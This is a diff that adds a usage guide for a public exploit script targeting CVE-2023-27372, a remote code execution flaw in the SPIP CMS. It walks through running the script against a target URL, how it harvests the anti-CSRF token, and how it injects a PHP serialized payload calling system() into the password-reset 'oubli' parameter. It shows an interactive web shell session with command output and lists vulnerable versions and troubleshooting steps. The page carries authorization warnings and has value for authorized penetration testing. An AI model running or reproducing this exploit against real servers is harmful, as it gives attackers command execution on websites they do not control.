@@ -1,0 +1,202 @@
+---
+title: Usage
+description: Learn how to run the CVE-2023-27372 SPIP RCE exploit and execute commands on vulnerable targets
+---
+
+<Warning>
+  This exploit is provided for educational and authorized security testing purposes only. Never use this tool against systems you don't own or have explicit permission to test. Unauthorized access to computer systems is illegal.
+</Warning>
+
+## Basic Usage
+
+The exploit requires a single mandatory argument: the target URL where SPIP is installed.
+
+```bash
+python3 CVE-2023-27372.py -u http://TARGET/spip
+```
+
+### Command-Line Arguments
+
+- **`-u URL, --url URL`** (required) - Target URL of the SPIP installation
+  - Example: `http://10.10.10.10/spip`
+  - Example: `https://example.com/spip`
+  - The URL should point to the root of the SPIP installation
+  - The script automatically appends `/spip.php?page=spip_pass` to access the password reset form
+
+## How It Works
+
+<Steps>
+  <Step title="Fetch CSRF Token">
+    The exploit first requests the password reset page at `/spip.php?page=spip_pass` to extract the anti-CSRF token from the `formulaire_action_args` input field.
+
+    ```
+    [*] Fetching anti-CSRF token...
+    ```
+  </Step>
+
+  <Step title="Test Vulnerability">
+    A test command (`id`) is executed to verify the target is vulnerable:
+
+    ```
+    [*] Testing command execution...
+    ```
+
+    If successful, you'll see:
+
+    ```
+    [+] Target is vulnerable! Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    ```
+  </Step>
+
+  <Step title="Interactive Shell">
+    Once vulnerability is confirmed, an interactive shell opens:
+
+    ```
+    [+] Shell opened. Type 'exit' or Ctrl+C to quit.
+
+    Shell>
+    ```
+  </Step>
+
+  <Step title="Execute Commands">
+    Type commands at the `Shell>` prompt. The exploit:
+    1. Refreshes the CSRF token for each request
+    2. Injects a PHP serialized payload into the `oubli` parameter
+    3. Extracts command output from the reflected response
+    4. Displays the output to you
+  </Step>
+</Steps>
+
+## Complete Example Session
+
+```bash
+$ python3 CVE-2023-27372.py -u http://10.10.10.10/spip
+[*] Fetching anti-CSRF token...
+[*] Testing command execution...
+[+] Target is vulnerable! Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+[+] Shell opened. Type 'exit' or Ctrl+C to quit.
+
+Shell> whoami
+www-data
+Shell> pwd
+/var/www/html/spip
+Shell> ls -la
+total 124
+drwxr-xr-x 12 www-data www-data  4096 Mar  6 10:15 .
+drwxr-xr-x  3 root     root      4096 Jan 10 08:30 ..
+-rw-r--r--  1 www-data www-data  1234 Jan 10 08:30 spip.php
+Shell> exit
+```
+
+## Interactive Shell Features
+
+### Command History
+
+The exploit uses `prompt_toolkit` to provide:
+- **Command history** - Use ↑/↓ arrow keys to navigate previous commands
+- **Auto-suggestions** - As you type, suggestions appear based on command history
+- **Line editing** - Standard readline-style editing (Ctrl+A, Ctrl+E, etc.)
+
+### Exiting the Shell
+
+You can exit the interactive shell in two ways:
+
+1. **Type `exit`** at the Shell> prompt
+   ```
+   Shell> exit
+   ```
+
+2. **Press Ctrl+C** to interrupt and quit
+   ```
+   Shell> ^C
+   Bye!
+   ```
+
+## Understanding the Output
+
+### Successful Execution
+
+When a command executes successfully, the output is displayed directly:
+
+```
+Shell> id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+### No Output
+
+Some commands may not produce output. In this case, you'll see:
+
+```
+Shell> touch /tmp/test
+(no output)
+```
+
+### Connection Issues
+
+If the request fails, you'll see an error message:
+
+```
+[-] Request failed: Connection timeout
+```
+
+<Note>
+  The exploit refreshes the CSRF token before each command execution (CVE-2023-27372.py:95) because SPIP regenerates it on every request. If token retrieval fails, the exploit will retry automatically.
+</Note>
+
+## Technical Details
+
+### Payload Structure
+
+The exploit injects a PHP serialized payload into the `oubli` parameter:
+
+```python
+payload = f's:{20 + len(command)}:"<?php system(\'{command}\'); ?>";'
+```
+
+### Vulnerable Versions
+
+- **SPIP < 3.2.18**
+- **SPIP 4.0.x < 4.0.10**
+- **SPIP 4.1.x < 4.1.8**
+- **SPIP 4.2.x < 4.2.1**
+
+### Fixed Versions
+
+- **SPIP ≥ 3.2.18**
+- **SPIP ≥ 4.0.10**
+- **SPIP ≥ 4.1.8**
+- **SPIP ≥ 4.2.1**
+
+## Troubleshooting
+
+### "Anti-CSRF token not found"
+
+```
+[-] Anti-CSRF token not found
+[-] Could not retrieve CSRF token. Target may not be vulnerable.
+```
+
+**Possible causes:**
+- The target is not running SPIP
+- The SPIP installation is at a different path
+- The target has custom modifications to the password reset form
+
+### "No command output received"
+
+```
+[-] No command output received. Target may not be vulnerable.
+```
+
+**Possible causes:**
+- The target is running a patched version of SPIP (≥ 4.2.1)
+- The vulnerability has been manually patched
+- Output extraction regex failed (rare edge case)
+
+### Connection Timeouts
+
+The exploit uses a 10-second timeout for all requests (CVE-2023-27372.py:26, 54). If your target is slow or behind a high-latency network, you may need to increase this value in the script.
+
+<Warning>
+  Remember: Only use this exploit on systems you own or have explicit written authorization to test. Unauthorized computer access is a crime in most jurisdictions.
+</Warning>
